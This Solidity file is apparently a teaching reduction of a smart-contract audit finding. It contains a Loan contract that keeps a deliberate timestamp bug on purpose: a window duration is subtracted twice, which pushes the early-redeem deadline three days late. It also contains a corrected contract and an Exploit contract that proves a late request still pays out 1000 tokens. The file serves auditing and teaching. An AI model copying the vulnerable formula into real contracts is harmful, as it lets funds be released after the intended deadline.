// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  OpenTrade — Incorrect Timestamp Calculation (OtterSec, finding 47891)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    calculateSchedule subtracts transferInWindowDurationDays twice, so
    earlyRedeemRequestClosingTimestamp is start + 26 days instead of
    start + 23 days. A request at start + 24 days still unlocks 1000.
    The corrected formula closes that request and unlocks 0. The bad
    delta is encoded in the formula. run() does not warp.
    Vulnerable assignment preserved verbatim (@> VULN). */

contract MockToken {
    string public name = "Loan Asset";
    string public symbol = "LOAN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

contract Loan {
    struct Settings {
        uint256 durationDays;
        uint256 transferInWindowDurationDays;
        uint256 transferOutWindowDurationDays;
    }

    Settings public settings;
    uint256 public accrualStartTimestamp;
    uint256 public earlyRedeemRequestClosingTimestamp;
    uint256 public principal;
    uint256 public unlocked;
    MockToken public token;
    address public lender;

    constructor(address token_, address lender_, uint256 start) {
        token = MockToken(token_);
        lender = lender_;
        accrualStartTimestamp = start;
        principal = 1000 ether;
        settings = Settings({durationDays: 30, transferInWindowDurationDays: 2, transferOutWindowDurationDays: 5});
    }

    function openSchedule() external {
        calculateSchedule();
    }

    // Loan.calculateSchedule — earlyRedeemRequestClosingTimestamp as quoted.
    function calculateSchedule() internal {
        earlyRedeemRequestClosingTimestamp =
            accrualStartTimestamp +
            (settings.durationDays -
            // @> VULN: transferInWindowDurationDays is subtracted here and again on the next line, so the deadline is 3 days late
            settings.transferInWindowDurationDays -
            settings.transferInWindowDurationDays) *
            (1 days);
        // FIX: subtract transferOutWindowDurationDays instead of the second transferInWindowDurationDays
    }

    function fairClosing() public view returns (uint256) {
        return accrualStartTimestamp +
            (settings.durationDays -
                settings.transferInWindowDurationDays -
                settings.transferOutWindowDurationDays) *
            (1 days);
    }

    function requestEarlyRedeem(uint256 requestTimestamp) external returns (uint256 paid) {
        require(requestTimestamp <= earlyRedeemRequestClosingTimestamp, "early redeem closed");
        paid = principal;
        token.transfer(lender, paid);
        unlocked = paid;
    }
}

contract LoanFixed {
    struct Settings {
        uint256 durationDays;
        uint256 transferInWindowDurationDays;
        uint256 transferOutWindowDurationDays;
    }

    Settings public settings;
    uint256 public accrualStartTimestamp;
    uint256 public earlyRedeemRequestClosingTimestamp;
    uint256 public principal = 1000 ether;
    MockToken public token;
    address public lender;

    constructor(address token_, address lender_, uint256 start) {
        token = MockToken(token_);
        lender = lender_;
        accrualStartTimestamp = start;
        settings = Settings({durationDays: 30, transferInWindowDurationDays: 2, transferOutWindowDurationDays: 5});
    }

    function openSchedule() external {
        earlyRedeemRequestClosingTimestamp =
            accrualStartTimestamp +
            (settings.durationDays -
                settings.transferInWindowDurationDays -
                settings.transferOutWindowDurationDays) *
            (1 days);
    }

    function requestEarlyRedeem(uint256 requestTimestamp) external returns (uint256 paid) {
        require(requestTimestamp <= earlyRedeemRequestClosingTimestamp, "early redeem closed");
        paid = principal;
        token.transfer(lender, paid);
    }
}

contract Exploit {
    address public constant LENDER = 0x0000000000000000000000000000000000000B0b;
    uint256 public constant START = 1_700_000_000;
    uint256 public constant PRINCIPAL = 1000 ether;

    MockToken public token;
    Loan public loan;
    uint256 public requestAt;
    uint256 public buggyClose;
    uint256 public fairClose;
    uint256 public paid;
    uint256 public fairUnlock;

    constructor() {
        token = new MockToken();
        loan = new Loan(address(token), LENDER, START);
    }

    function run() external {
        loan.openSchedule();
        buggyClose = loan.earlyRedeemRequestClosingTimestamp();
        fairClose = loan.fairClosing();
        requestAt = START + 24 days;
        fairUnlock = requestAt <= fairClose ? PRINCIPAL : 0;
        token.mint(address(loan), PRINCIPAL);
        paid = loan.requestEarlyRedeem(requestAt);
        require(buggyClose == START + 26 days, "buggy close is not day 26");
        require(fairClose == START + 23 days, "fair close is not day 23");
        require(requestAt > fairClose, "request is not after the fair close");
        require(requestAt <= buggyClose, "request is not inside the buggy window");
        require(paid == PRINCIPAL, "lender was not paid 1000");
        require(fairUnlock == 0, "fair unlock is not 0");
        require(token.balanceOf(LENDER) == PRINCIPAL, "lender balance");
    }
}
